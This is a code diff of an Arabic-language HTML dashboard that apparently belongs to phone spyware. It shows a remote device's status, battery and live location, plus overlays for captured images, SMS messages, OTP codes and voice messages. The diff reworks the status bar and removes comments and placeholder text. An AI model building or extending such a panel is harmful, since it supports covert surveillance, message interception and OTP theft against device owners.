@@ -48,9 +48,23 @@
         </header>
 
         <div class="status-bar">
-            <div class="status-item"><span class="label">الحالة:</span><span id="networkStatus" class="value">غير متصل</span></div>
-            <div class="status-item"><span class="label">البطارية:</span><span id="batteryStatus" class="value">—</span></div>
-            <div class="status-item"><span class="label">آخر اتصال:</span><span id="lastSeen" class="value">—</span></div>
+            <div class="status-item">
+                <span class="label">الحالة:</span>
+                <span id="networkStatus" class="value">غير متصل</span>
+            </div>
+            <div class="status-item">
+                <span class="label">📶 الشبكة:</span>
+                <span id="networkTypeStatus" class="value">—</span>
+            </div>
+            <div class="status-item">
+                <span class="label">🔋 البطارية:</span>
+                <span id="batteryStatus" class="value">—</span>
+                <span id="chargingStatus" style="color:#00ff88;font-size:12px;font-weight:bold;margin-right:5px;"></span>
+            </div>
+            <div class="status-item">
+                <span class="label">🕐 آخر اتصال:</span>
+                <span id="lastSeen" class="value">—</span>
+            </div>
         </div>
 
         <div class="tabs">
@@ -96,7 +110,6 @@
                 </div>
             </div>
 
-            <!-- ✅ محدّث: تبويب الموقع مع خريطة حية -->
             <div id="locationTab" class="tab-pane">
                 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:15px;flex-wrap:wrap;gap:10px;">
                     <h3 style="margin:0;border:none;padding:0;">📍 الموقع الحي</h3>
@@ -188,7 +201,6 @@
         </div>
     </div>
 
-    <!-- ✅ نافذة الصور الفورية -->
     <div id="liveImagesOverlay" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;overflow-y:auto;padding:20px;">
         <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:10px;">
             <h2 style="color:#00ffcc;text-shadow:0 0 15px #00ffcc;">📸 الصور الفورية</h2>
@@ -198,11 +210,10 @@
             </div>
         </div>
         <div id="liveImagesGrid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:15px;">
-            <p style="color:#666;grid-column:1/-1;text-align:center;padding:50px;">في انتظار صور جديدة... خذ سكرين شوت أو استقبل صورة واتساب وراح تظهر هنا فوراً</p>
+            <p style="color:#666;grid-column:1/-1;text-align:center;padding:50px;">في انتظار صور جديدة...</p>
         </div>
     </div>
 
-    <!-- ✅ نافذة الرسائل الفورية -->
     <div id="liveMsgsOverlay" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;overflow-y:auto;padding:20px;">
         <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:10px;">
             <h2 style="color:#ff0066;text-shadow:0 0 15px #ff0066;">💬 الرسائل الفورية</h2>
@@ -215,11 +226,10 @@
             </div>
         </div>
         <div id="liveMsgsList" style="display:flex;flex-direction:column;gap:10px;">
-            <p style="color:#666;text-align:center;padding:50px;">في انتظار رسائل جديدة... أرسل أو استقبل رسالة SMS وراح تظهر هنا فوراً</p>
+            <p style="color:#666;text-align:center;padding:50px;">في انتظار رسائل جديدة...</p>
         </div>
     </div>
 
-    <!-- ✅ نافذة OTP الفورية -->
     <div id="liveOtpOverlay" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;overflow-y:auto;padding:20px;">
         <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:10px;">
             <h2 style="color:#ffcc00;text-shadow:0 0 15px #ffcc00;">🔐 أكواد OTP</h2>
@@ -233,7 +243,6 @@
         </div>
     </div>
 
-    <!-- ✅ نافذة الرسائل الصوتية -->
     <div id="liveVoicesOverlay" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;overflow-y:auto;padding:20px;">
         <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:10px;">
             <h2 style="color:#00ffcc;text-shadow:0 0 15px #00ffcc;">🎤 الرسائل الصوتية</h2>
@@ -252,8 +261,6 @@
     <script>
     document.addEventListener('DOMContentLoaded', function() { playSound(); });
     function playSound() { try { const audio = new Audio('v.wav'); audio.volume = 1.0; audio.play(); } catch (e) {} }
-
-    // ✅ إعادة تحميل الخريطة عند فتح التبويب
     function reloadMap() {
         const iframe = document.getElementById('mapFrame');
         if (iframe) iframe.src = iframe.src;
